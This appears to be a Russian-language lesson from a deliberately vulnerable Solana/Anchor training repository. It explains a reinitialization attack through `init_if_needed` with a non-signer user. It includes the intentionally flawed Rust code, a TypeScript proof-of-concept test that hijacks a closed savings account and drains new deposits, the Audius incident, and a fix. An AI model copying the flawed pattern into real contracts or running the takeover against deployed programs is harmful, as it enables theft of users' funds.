# 07 — Реинициализация через `init_if_needed`

**Класс:** Reinitialization attack + отсутствие подписанта при «открытии»
аккаунта.
**Файлы:** `programs/vuln07_reinit/`, `tests/07_reinit.test.ts`.
**Последствие:** атакующий «подбирает» закрытый аккаунт жертвы, становится его
администратором и забирает новые депозиты жертвы.

## 1. Суть уязвимости

`init_if_needed` в Anchor создаёт аккаунт, **если он пуст**, и молча пропускает
инициализацию, если аккаунт уже существует. Комбинация двух ошибок:

1. `open_savings` использует `init_if_needed` — после того как владелец закрыл
   счёт (`close` обнуляет аккаунт и возвращает аренду), любой может заново
   создать PDA **по тому же адресу** и с **себой** как владельцем.
2. `user` в `open_savings` — не `Signer`: «открыть счёт» можно для любого
   адреса, а значит, и перехватить право на существующий адрес.

Адрес PDA вычисляется из сеятельства (например, тега) — он публичен и
предсказуем, поэтому автоматика жертвы продолжит депонировать **в тот же
адрес**, не зная, что владельцем стал атакующий.

## 2. Уязвимый код

```rust
#[derive(Accounts)]
pub struct OpenSavings<'info> {
    // БАГ 1: init_if_needed пересоздаёт закрытый аккаунт
    #[account(init_if_needed, payer = payer, seeds = [b"savings", tag.as_bytes()], bump)]
    pub savings: Account<'info, Savings>,
    /// CHECK: БАГ 2 — не Signer: «открыть» можно на чужое имя
    pub user: UncheckedAccount<'info>,
    #[account(mut)]
    pub payer: Signer<'info>,
    pub system_program: Program<'info, System>,
}

pub fn open_savings(ctx: Context<OpenSavings>, tag: String) -> Result<()> {
    let savings = &mut ctx.accounts.savings;
    if savings.authority == Pubkey::default() {
        savings.authority = ctx.accounts.user.key();   // владелец = кто пришёл
        savings.balance = 0;
    }
    Ok(())
}
```

`close_savings` (легитимный) вызывает `close()` — аккаунт становится пустым,
адрес свободен.

## 3. Как эксплуатируется

Тест `tests/07_reinit.test.ts`:

1. Жертва: `openSavings("tag")` → `deposit(500)` → `closeSavings()` —
   легитимный жизненный цикл, 500 токенов жертвы остались в vault (выведены
   до закрытия), адрес `savingsPda` освободился.
2. Атакующий «снипует» освобождённый PDA: `openSavings("tag")` с **себя**.
   `init_if_needed` видит пустой аккаунт и создаёт его с authority=attacker.
3. Автоматика жертвы делает очередной депозит (300) в тот же адрес —
   permissionless, подпись «владельца» не требуется.
4. Атакующий `withdraw(300)` — новый баланс жертвы уходит ему.

```ts
// снайп закрытого PDA
await program.methods.openSavings(TAG)
  .accounts({ savings: savingsPda, user: attacker.publicKey, payer: attacker.publicKey })
  .signers([attacker]).rpc();
const savings = await program.account.savings.fetch(savingsPda);
assert.equal(savings.authority.toString(), attacker.publicKey.toString()); // перехват

// жертва депонирует «в свою» копилку — уже захваченную
await program.methods.deposit(new BN(300))
  .accounts({ savings: savingsPda, user: victim.publicKey, ... }).signers([victim]).rpc();

// атакующий забирает
await program.methods.withdraw(new BN(300)).accounts({ savings: savingsPda, user: attacker.publicKey, ... }).signers([attacker]).rpc();
```

## 4. Результат атаки (проверяется тестом)

```ts
assert.equal(savings.authority.toString(), attacker.publicKey.toString());
assert.equal((await tokenBalance(attackerAta)).toString(), "300"); // свежие депозиты жертвы
```

## 5. Реальный кейс: Audius (август 2022, ~$6M)

**Audius** — музыкальный протокол на Solana. Атакующий через **self-CPI**
(программа вызывает себя, чтобы обойти проверки вызывающего) **переинициализировал**
контракт управления (guardian pool config), который был закрыт/деинициализирован,
назначил свои параметры и вывел ~18.5M AUDIO (~$6M). Реинициализация закрытых
аккаунтов — прямой родитель этого класса; после инцидента в него добавили
проверки занятости и ownership при инициализации.

## 6. Исправление

```rust
#[derive(Accounts)]
pub struct OpenSavingsFixed<'info> {
    // НИКОГДА init_if_needed для аккаунтов с правами:
    #[account(init, payer = payer, seeds = [b"savings", owner.key().as_ref()], bump, space = ...)]
    pub savings: Account<'info, Savings>,
    pub owner: Signer<'info>,                 // только настоящий будущий владелец
    #[account(mut)]
    pub payer: Signer<'info>,
    pub system_program: Program<'info, System>,
}
```

Правила:

1. `init_if_needed` запрещён для аккаунтов, содержащих **authority/владение**:
   он не может отличить «новый» от «пересозданный после close».
2. Адрес PDA должен включать ключ владельца: `seeds = [b"savings", owner.key()]` —
   тогда чужой адрес недостижим в принципе.
3. `user`/`authority` в инициализирующих инструкциях — всегда `Signer`.
4. Если нужен «открыть, если нет» — делайте отдельные `init`-версию и
   `get_or_check`-версию, явно проверяя `authority`.

## 7. Запуск

```bash
./scripts/run_tests.sh tests/07_reinit.test.ts
```
